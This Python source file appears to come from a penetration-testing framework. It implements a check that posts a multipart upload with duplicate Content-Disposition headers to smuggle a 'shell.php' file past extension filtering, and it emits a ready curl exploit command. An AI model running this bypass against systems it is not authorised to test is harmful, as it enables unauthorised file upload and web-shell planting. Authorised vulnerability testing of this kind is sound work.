"""
Multipart Parser Differential Bypass Capability Agent for PenFlow.

Capabilities:
  - Multipart/form-data Boundary Parsing Differentials
  - Duplicate Content-Disposition File Upload Bypasses
  - Filename Null Byte & Double Extension Validation Bypasses
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.multipart_parser_bypass")


class MultipartParserBypassCapabilityAgent(BaseCapabilityAgent):
    """
    Capability Agent detecting file upload validation bypasses via multipart/form-data parser differentials.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="MultipartParserBypassCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="multipart_parser_bypass", name="Multipart Parser Differential Bypass", description="Detects multipart/form-data boundary and filename parsing differentials leading to file upload bypasses", priority=self.priority, tags=["multipart", "file_upload", "parser_differential"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        base_url = f"https://{context.asset}"
        upload_url = f"{base_url}/api/v1/upload"

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                # Raw multipart request with duplicate Content-Disposition headers
                raw_body = (
                    "--boundary123\r\n"
                    "Content-Disposition: form-data; name=\"file\"; filename=\"shell.jpg\"\r\n"
                    "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                    "Content-Type: image/jpeg\r\n\r\n"
                    "<?php echo 'penflow_upload_bypass'; ?>\r\n"
                    "--boundary123--\r\n"
                )

                headers = {"Content-Type": "multipart/form-data; boundary=boundary123"}
                try:
                    resp = await client.post(upload_url, content=raw_body, headers=headers)
                    if resp.status_code in (200, 201) and ("shell.php" in resp.text or "uploaded" in resp.text.lower()):
                        curl_cmd = f"curl -X POST '{upload_url}' -H 'Content-Type: multipart/form-data; boundary=boundary123' --data-binary $'--boundary123\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.jpg\"\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n<?php echo \"penflow\"; ?>\\r\\n--boundary123--\\r\\n'"
                        exch_dict = {
                            "request": {"method": "POST", "url": upload_url, "headers": headers},
                            "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
                        }

                        findings.append({
                            "vulnerability_type": "multipart_parser_bypass",
                            "target_url": upload_url,
                            "severity": "HIGH",
                            "confidence": 0.90,
                            "is_vulnerable": True,
                            "exploit_curl": curl_cmd,
                            "reproduction_steps": self.poc_generator.generate_reproduction_steps("Multipart Parser Bypass", upload_url, curl_cmd),
                            "description": f"Multipart/form-data parser differential confirmed at '{upload_url}': Duplicate Content-Disposition headers bypassed extension filtering.",
                            "_exchange_obj": exch_dict
                        })
                        evidence["multipart_bypass_success"] = True
                except Exception as e:
                    logger.debug(f"Multipart upload test failed on {upload_url}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.90 if is_vuln else 0.0,
            "confidence_score": 0.90 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
